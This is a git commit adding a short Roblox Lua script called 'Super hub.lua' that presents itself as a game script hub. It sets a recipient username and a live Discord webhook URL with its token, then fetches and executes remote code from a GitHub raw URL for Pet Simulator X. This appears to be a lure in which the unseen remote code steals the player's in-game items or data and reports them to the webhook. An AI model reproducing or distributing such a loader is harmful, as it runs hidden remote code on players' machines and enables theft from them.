5a42e99cf1a0a97af3cc8797f7b1c50ca5cd4221
TONOYAK1 <124351455+TONOYAK1@users.noreply.github.com>
2023-02-05 20:34:57 +0630

    Create Super hub.lua

---
+++ Super hub.lua
@@ -0,0 +1,9 @@
+Username = "TONOY_TALK "
+WebHook = "https://discord.com/api/webhooks/1070742922577842317/YzCGPYvu6E4aXmhlznbBjO1x7XAD2bzMHQQyq9pxTvC-1XWzjQCnpcgptfqhcNLyXmKm"
+
+_G.CustomScriptName = "Super hub"
+_G.Text1 = "https://discord.gg/Y3ZBJ5yshg"
+_G.Text2 = "Super#2093"
+_G.Text3 = "making key"
+_G.Text4 = "loaded!"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
